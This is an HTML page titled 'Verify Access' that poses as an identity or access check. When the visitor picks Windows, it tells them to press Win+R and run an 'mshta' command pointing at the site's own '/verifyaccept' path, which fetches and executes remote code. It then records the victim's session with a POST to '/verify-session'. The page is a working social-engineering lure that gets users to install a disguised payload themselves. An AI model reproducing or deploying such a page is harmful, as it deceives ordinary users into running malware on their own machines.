<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Verify Access</title>
  <style>
    body { background: #111; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .card { background: #1e1e1e; padding: 30px; border-radius: 16px; box-shadow: 0 0 12px rgba(255,255,255,0.1); max-width: 400px; width: 90%; }
    button { padding: 10px; border: none; border-radius: 8px; background: #007bff; color: #fff; font-weight: bold; margin: 10px 0; cursor: pointer; }
    button:hover { background: #0056b3; }
  </style>
</head>
<body>
  <div class="card">
    <h2>What is your OS?</h2>
    <button id="windowsBtn">Windows</button>
    <button id="otherBtn">Other OS</button>
    <div id="instructions"></div>
  </div>
  <script>
    function getSessionId() {
      let sid = localStorage.getItem('sessionId');
      if (!sid) {
        sid = Math.random().toString(36).slice(2) + Date.now();
        localStorage.setItem('sessionId', sid);
      }
      return sid;
    }
    const sessionId = getSessionId();

    document.getElementById('windowsBtn').onclick = () => {
      document.getElementById('instructions').innerHTML = `
        <p>Press <b>Win+R</b> and type:</p>
        <pre>mshta ${window.location.origin}/verifyaccept</pre>
        <p>When you see "ACCEPTED", click below:</p>
        <button id="acceptBtn">I Accept</button>
      `;
      setTimeout(() => {
        document.getElementById('acceptBtn').onclick = async () => {
          await fetch('/verify-session', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'x-session-id': sessionId },
            body: JSON.stringify({ os: 'windows', sessionId })
          });
          alert('Verified! Returning...');
          window.location = '/';
        };
      }, 100);
    };

    document.getElementById('otherBtn').onclick = () => {
      window.location = '/verifynotwindows';
    }
  </script>
</body>
</html>
